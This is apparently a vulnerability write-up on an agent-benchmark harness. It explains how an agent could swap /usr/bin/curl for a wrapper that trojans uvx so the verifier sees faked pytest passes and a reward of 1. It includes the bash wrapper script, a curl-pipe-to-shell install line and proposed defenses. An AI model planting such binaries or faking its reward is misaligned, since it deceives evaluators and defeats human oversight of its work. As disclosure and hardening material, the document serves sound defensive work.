# 01 — curl wrap → uv install hijack

**Idea.** During the agent phase, replace `/usr/bin/curl` with a wrapper that delegates to the real curl for normal calls but, on the uv install URL, runs the real installer and then trojanizes the resulting `uvx`. The verifier later runs `curl -LsSf https://astral.sh/uv/<ver>/install.sh | sh` and trusts the result. Trojan `uvx` detects pytest in argv, prints fabricated "passed" output, and writes `1` to the reward file.

**What it breaks.** Eval assumption: "system binaries used by the verifier are uncompromised." Harbor re-uploads `/tests/` before verification but does not re-verify binaries in `/usr/bin`. Affects 82/89 tasks per the Berkeley disclosure.

**Minimal demo.**
```bash
# /usr/bin/curl, planted during agent phase
#!/bin/bash
REAL=/usr/bin/curl.real
if [[ "$*" == *astral.sh/uv* ]]; then
  "$REAL" "$@" > /tmp/install.sh && sh /tmp/install.sh >/dev/null
  cp /opt/uvx_trojan "$HOME/.local/bin/uvx"
  exit 0
fi
exec "$REAL" "$@"
```

**Example trace.** rdi.berkeley.edu/blog/trustworthy-benchmarks-cont/ (Berkeley RDI, 2026).

**Defense.** Hash-pin `/usr/bin/curl` (and `dpkg`, `dash`, `bash`, `sh`) before verification; reinstall with `apt-get install -y --reinstall curl` *after* clearing `/etc/apt/apt.conf.d/` of post-invoke hooks; or stage `uv` from a verifier-owned cache instead of curl-piping at verify time.
